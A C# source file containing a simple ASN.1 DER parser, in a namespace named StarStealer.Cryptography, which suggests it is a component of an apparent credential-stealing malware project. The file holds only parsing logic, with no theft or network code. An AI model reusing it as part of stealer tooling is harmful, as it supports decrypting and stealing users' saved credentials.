using System;
using System.Linq;

namespace StarStealer.Cryptography
{
	public class Asn1Der
	{
		public enum Type
		{
			Sequence = 48,
			Integer = 2,
			BitString = 3,
			OctetString = 4,
			Null = 5,
			ObjectIdentifier = 6
		}

		public Asn1DerObject Parse(byte[] dataToParse)
		{
			Asn1DerObject asn1DerObject = new Asn1DerObject();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				int num = 0;
				switch (dataToParse[i])
				{
				case 48:
				{
					byte[] array;
					if (asn1DerObject.Lenght == 0)
					{
						asn1DerObject.Type = Type.Sequence;
						asn1DerObject.Lenght = dataToParse.Length - (i + 2);
						array = new byte[asn1DerObject.Lenght];
					}
					else
					{
						asn1DerObject.objects.Add(new Asn1DerObject
						{
							Type = Type.Sequence,
							Lenght = dataToParse[i + 1]
						});
						array = new byte[dataToParse[i + 1]];
					}
					num = ((array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length);
					Array.Copy(dataToParse, i + 2, array, 0, array.Length);
					asn1DerObject.objects.Add(Parse(array));
					i = i + 1 + dataToParse[i + 1];
					break;
				}
				case 2:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Type.Integer,
						Lenght = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse.ToArray(), i + 2, array, 0, num);
					asn1DerObject.objects.Last().Data = array;
					i = i + 1 + asn1DerObject.objects.Last().Lenght;
					break;
				}
				case 4:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Type.OctetString,
						Lenght = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse.ToArray(), i + 2, array, 0, num);
					asn1DerObject.objects.Last().Data = array;
					i = i + 1 + asn1DerObject.objects.Last().Lenght;
					break;
				}
				case 6:
				{
					asn1DerObject.objects.Add(new Asn1DerObject
					{
						Type = Type.ObjectIdentifier,
						Lenght = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse.ToArray(), i + 2, array, 0, num);
					asn1DerObject.objects.Last().Data = array;
					i = i + 1 + asn1DerObject.objects.Last().Lenght;
					break;
				}
				}
			}
			return asn1DerObject;
		}
	}
}
